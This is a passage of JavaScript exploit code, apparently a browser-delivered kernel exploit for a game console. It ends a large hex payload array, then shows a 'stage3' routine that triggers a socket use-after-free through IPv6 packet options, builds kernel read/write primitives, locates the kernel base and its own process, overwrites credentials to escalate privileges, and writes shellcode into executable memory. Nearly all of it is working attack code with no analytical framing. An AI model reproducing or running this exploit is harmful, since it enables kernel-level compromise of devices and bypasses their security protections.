  payload_writer[5005] = 0x00706d63;
  payload_writer[5006] = 0x63727473;
  payload_writer[5007] = 0x73007970;
  payload_writer[5008] = 0x636e7274;
  payload_writer[5009] = 0x73007970;
  payload_writer[5010] = 0x61637274;
  payload_writer[5011] = 0x74730074;
  payload_writer[5012] = 0x61636e72;
  payload_writer[5013] = 0x74730074;
  payload_writer[5014] = 0x6e656c72;
  payload_writer[5015] = 0x72747300;
  payload_writer[5016] = 0x00706d63;
  payload_writer[5017] = 0x6e727473;
  payload_writer[5018] = 0x00706d63;
  payload_writer[5019] = 0x69727073;
  payload_writer[5020] = 0x0066746e;
  payload_writer[5021] = 0x72706e73;
  payload_writer[5022] = 0x66746e69;
  payload_writer[5023] = 0x63737300;
  payload_writer[5024] = 0x00666e61;
  payload_writer[5025] = 0x63727473;
  payload_writer[5026] = 0x73007268;
  payload_writer[5027] = 0x63727274;
  payload_writer[5028] = 0x73007268;
  payload_writer[5029] = 0x74737274;
  payload_writer[5030] = 0x74730072;
  payload_writer[5031] = 0x70756472;
  payload_writer[5032] = 0x6e697200;
  payload_writer[5033] = 0x00786564;
  payload_writer[5034] = 0x69647369;
  payload_writer[5035] = 0x00746967;
  payload_writer[5036] = 0x696f7461;
  payload_writer[5037] = 0x72747300;
  payload_writer[5038] = 0x7970636c;
  payload_writer[5039] = 0x72747300;
  payload_writer[5040] = 0x6f727265;
  payload_writer[5041] = 0x475f0072;
  payload_writer[5042] = 0x63707465;
  payload_writer[5043] = 0x65707974;
  payload_writer[5044] = 0x74535f00;
  payload_writer[5045] = 0x006c756f;
  payload_writer[5046] = 0x706f6362;
  payload_writer[5047] = 0x72730079;
  payload_writer[5048] = 0x00646e61;
  payload_writer[5049] = 0x74637361;
  payload_writer[5050] = 0x00656d69;
  payload_writer[5051] = 0x74637361;
  payload_writer[5052] = 0x5f656d69;
  payload_writer[5053] = 0x6d670072;
  payload_writer[5054] = 0x656d6974;
  payload_writer[5055] = 0x746d6700;
  payload_writer[5056] = 0x5f656d69;
  payload_writer[5057] = 0x6f6c0073;
  payload_writer[5058] = 0x746c6163;
  payload_writer[5059] = 0x00656d69;
  payload_writer[5060] = 0x61636f6c;
  payload_writer[5061] = 0x6d69746c;
  payload_writer[5062] = 0x00725f65;
  payload_writer[5063] = 0x69746b6d;
  payload_writer[5064] = 0x6f00656d;
  payload_writer[5065] = 0x646e6570;
  payload_writer[5066] = 0x72007269;
  payload_writer[5067] = 0x64646165;
  payload_writer[5068] = 0x72007269;
  payload_writer[5069] = 0x64646165;
  payload_writer[5070] = 0x725f7269;
  payload_writer[5071] = 0x6c657400;
  payload_writer[5072] = 0x7269646c;
  payload_writer[5073] = 0x65657300;
  payload_writer[5074] = 0x7269646b;
  payload_writer[5075] = 0x77657200;
  payload_writer[5076] = 0x64646e69;
  payload_writer[5077] = 0x63007269;
  payload_writer[5078] = 0x65736f6c;
  payload_writer[5079] = 0x00726964;
  payload_writer[5080] = 0x66726964;
  payload_writer[5081] = 0x65670064;
  payload_writer[5082] = 0x6f727074;
  payload_writer[5083] = 0x6d616e67;
  payload_writer[5084] = 0x6f660065;
  payload_writer[5085] = 0x006e6570;
  payload_writer[5086] = 0x61657266;
  payload_writer[5087] = 0x77660064;
  payload_writer[5088] = 0x65746972;
  payload_writer[5089] = 0x65736600;
  payload_writer[5090] = 0x66006b65;
  payload_writer[5091] = 0x6c6c6574;
  payload_writer[5092] = 0x6c636600;
  payload_writer[5093] = 0x0065736f;
  payload_writer[5094] = 0x69727066;
  payload_writer[5095] = 0x0066746e;
  payload_writer[5096] = 0x25002e2e;
  payload_writer[5097] = 0x73252f73;
  payload_writer[5098] = 0x74736600;
  payload_writer[5099] = 0x00657079;
  payload_writer[5100] = 0x61707366;
  payload_writer[5101] = 0x66006874;
  payload_writer[5102] = 0x006d6f72;
  payload_writer[5103] = 0x00736579;
  payload_writer[5104] = 0x6772616c;
  payload_writer[5105] = 0x74730065;
  payload_writer[5106] = 0x63697461;
  payload_writer[5107] = 0x6d697400;
  payload_writer[5108] = 0x6e6f7a65;
  payload_writer[5109] = 0x73610065;
  payload_writer[5110] = 0x00636e79;
  payload_writer[5111] = 0x6f6e6769;
  payload_writer[5112] = 0x63616572;
  payload_writer[5113] = 0x6964006c;
  payload_writer[5114] = 0x73616d72;
  payload_writer[5115] = 0x6c2f006b;
  payload_writer[5116] = 0x34366269;
  payload_writer[5117] = 0x2d646c2f;
  payload_writer[5118] = 0x756e696c;
  payload_writer[5119] = 0x38782d78;
  payload_writer[5120] = 0x34362d36;
  payload_writer[5121] = 0x2e6f732e;
  payload_writer[5122] = 0x00000032;
  payload_writer[5123] = 0x00000000;
  payload_writer[5124] = 0x00000000;
  payload_writer[5125] = 0x00000000;
  payload_writer[5126] = 0x00000000;
  payload_writer[5127] = 0x00000000;
  payload_writer[5128] = 0x00000000;
  payload_writer[5129] = 0x00000000;
  payload_writer[5130] = 0x00000000;
  payload_writer[5131] = 0x00000000;
  payload_writer[5132] = 0x00000001;
  payload_writer[5133] = 0x00000001;
  payload_writer[5134] = 0x00000001;
  payload_writer[5135] = 0x00000000;
  payload_writer[5136] = 0x00000000;
  payload_writer[5137] = 0x00000000;
  payload_writer[5138] = 0x00000000;
  payload_writer[5139] = 0x00000000;
  payload_writer[5140] = 0x6ffffef5;
  payload_writer[5141] = 0x00000000;
  payload_writer[5142] = 0x26205030;
  payload_writer[5143] = 0x00000009;
  payload_writer[5144] = 0x00000005;
  payload_writer[5145] = 0x00000000;
  payload_writer[5146] = 0x26205028;
  payload_writer[5147] = 0x00000009;
  payload_writer[5148] = 0x00000006;
  payload_writer[5149] = 0x00000000;
  payload_writer[5150] = 0x26205010;
  payload_writer[5151] = 0x00000009;
  payload_writer[5152] = 0x0000000a;
  payload_writer[5153] = 0x00000000;
  payload_writer[5154] = 0x00000001;
  payload_writer[5155] = 0x00000000;
  payload_writer[5156] = 0x0000000b;
  payload_writer[5157] = 0x00000000;
  payload_writer[5158] = 0x00000018;
  payload_writer[5159] = 0x00000000;
  payload_writer[5160] = 0x00000015;
  payload_writer[5161] = 0x00000000;
  payload_writer[5162] = 0x00000000;
  payload_writer[5163] = 0x00000000;
  payload_writer[5164] = 0x0000001e;
  payload_writer[5165] = 0x00000000;
  payload_writer[5166] = 0x00000008;
  payload_writer[5167] = 0x00000000;
  payload_writer[5168] = 0x6ffffffb;
  payload_writer[5169] = 0x00000000;
  payload_writer[5170] = 0x08000001;
  payload_writer[5171] = 0x00000000;
  payload_writer[5172] = 0x00000000;
  payload_writer[5173] = 0x00000000;
  payload_writer[5174] = 0x00000000;
  payload_writer[5175] = 0x00000000;
  payload_writer[5176] = 0x00000000;
  payload_writer[5177] = 0x00000000;
  payload_writer[5178] = 0x00000000;
  payload_writer[5179] = 0x00000000;
  payload_writer[5180] = 0x00000000;
  payload_writer[5181] = 0x00000000;
  payload_writer[5182] = 0x00000000;
  payload_writer[5183] = 0x00000000;
  payload_writer[5184] = 0x00000000;
  payload_writer[5185] = 0x00000000;
  payload_writer[5186] = 0x00000000;
  payload_writer[5187] = 0x00000000;
  payload_writer[5188] = 0x00000000;
  payload_writer[5189] = 0x00000000;
  payload_writer[5190] = 0x00000000;
  payload_writer[5191] = 0x00000000;
  payload_writer[5192] = 0x00000000;
  payload_writer[5193] = 0x00000000;
  payload_writer[5194] = 0x00000000;
  payload_writer[5195] = 0x00000000;




	chain.call(payload_buffer);
	/*
    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(payload_buffer);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
  */
}

function stage3() {

  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;
  const PKTOPTS_RTHDR_OFFSET = 0x68;
  const PKTOPTS_TCLASS_OFFSET = 0xB0;

  const PROC_UCRED_OFFSET = 0x40;
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xB0;


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x120;

  const KERNEL_M_IP6OPT_OFFSET = 0x1A7AEA0;
  const KERNEL_MALLOC_OFFSET = 0x301840;
  const KERNEL_ALLPROC_OFFSET = 0x1B48318;
  const KERNEL_PMAP_STORE_OFFSET = 0x22C5268;

  const NUM_SPRAY_SOCKS = 200;
  const NUM_LEAK_SOCKS = 200;
  const NUM_SLAVE_SOCKS = 300;

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave");
    while (1) {};
  }

  function kernel_read8(address) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
    }
    chain.run();
    return p.read8(pktinfo_buffer);
  }

  function kernel_write8(address, value) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
      chain.push_write8(pktinfo_buffer, value);
      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    }
    chain.run();
  }

  function brute_force_kernel_map() {
    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
    for (var i = 0; i < 0xC0; i++) {
      var kernel_pmap_store = kernel_read8(attempt);
      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
        if ((kernel_base.low & 0x3FFF) == 0x0) {
          return;
        }
      }
      attempt.sub32inplace(0x01000000);
    }
    alert("[ERROR] failed to find kernel_map");
    while (1) {};
  }

  function find_proc() {
    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = kernel_read8(proc);
    }
    alert("[ERROR] failed to find proc");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = kernel_read8(filedesc);
    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //find vvictim
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

  find_execution_socket();
  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
  var write_handle = chain.syscall(534, exec_handle, 3);
  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  chain.syscall(324, 1);
  if(exec_address.low != 0x90000000) {
      alert("[ERROR] failed to allocate jit memory");
      while(1){};
  }
  var exec_writer = p.array_from_address(write_address, 0x4000);
  for(var i = 0; i < 0x200; i++) {
      exec_writer[i] = 0x90909090;
  }
  exec_writer[0x200] = 0x37C0C748;
  exec_writer[0x201] = 0xC3000013;
  if(chain.call(exec_address).low != 0x1337) {
      alert("[ERROR] hmm weird");
      while(1){};
  }

  exec_writer[0] = 0x54415355;
  exec_writer[1] = 0x1111BB48;
  exec_writer[2] = 0x11111111;
  exec_writer[3] = 0xBD481111;
  exec_writer[4] = 0x22222222;
  exec_writer[5] = 0x22222222;
  exec_writer[6] = 0xBFE4314D;
  exec_writer[7] = 0x000000C0;
  exec_writer[8] = 0xBADE8948;
  exec_writer[9] = 0x00000002;
  exec_writer[10] = 0x8349D5FF;
  exec_writer[11] = 0x814901C4;
  exec_writer[12] = 0x000500FC;
  exec_writer[13] = 0x41E47500;
  exec_writer[14] = 0x655D5B5C;
  exec_writer[15] = 0x25048B48;
  exec_writer[16] = 0x00000000;
  exec_writer[17] = 0x08408B48;
  exec_writer[18] = 0x48408B48;
  exec_writer[19] = 0x48008B48;
  exec_writer[20] = 0x333333B9;
  exec_writer[21] = 0x33333333;
  exec_writer[22] = 0xC7C74833;
  exec_writer[23] = 0x000002BE; // num sockets
  exec_writer[24] = 0x48F63148;
  exec_writer[25] = 0x117DFE39;
  exec_writer[26] = 0x48B1148B;
  exec_writer[27] = 0x00D004C7;
  exec_writer[28] = 0x48000000;
  exec_writer[29] = 0xEB01C683;
  exec_writer[30] = 0x44BF48EA;
  exec_writer[31] = 0x44444444;
  exec_writer[32] = 0x48444444;
  exec_writer[33] = 0x555555BE;
  exec_writer[34] = 0x55555555;
  exec_writer[35] = 0x37894855;
  exec_writer[36] = 0x6666BF48;
  exec_writer[37] = 0x66666666;
  exec_writer[38] = 0x200F6666;
  exec_writer[39] = 0xFF2548C0;
  exec_writer[40] = 0x0FFFFEFF;
  exec_writer[41] = 0x87C6C022;
  exec_writer[42] = 0x0063A160;
  exec_writer[43] = 0xC087C7C3;
  exec_writer[44] = 0x480063AC;
  exec_writer[45] = 0xC7C3C031;
  exec_writer[46] = 0x639F1087;
  exec_writer[47] = 0xC0314800;
  exec_writer[48] = 0xE087C7C3;
  exec_writer[49] = 0x480063A6;
  exec_writer[50] = 0xC6C3C031;
  exec_writer[51] = 0x67B5C087;
  exec_writer[52] = 0xBE480002;
  exec_writer[53] = 0x90909090;
  exec_writer[54] = 0x8B499090;
  exec_writer[55] = 0x08B78948;
  exec_writer[56] = 0xC700264C;
  exec_writer[57] = 0x087B7087;
  exec_writer[58] = 0x0000B800;
  exec_writer[59] = 0x9087C700;
  exec_writer[60] = 0x00000004;
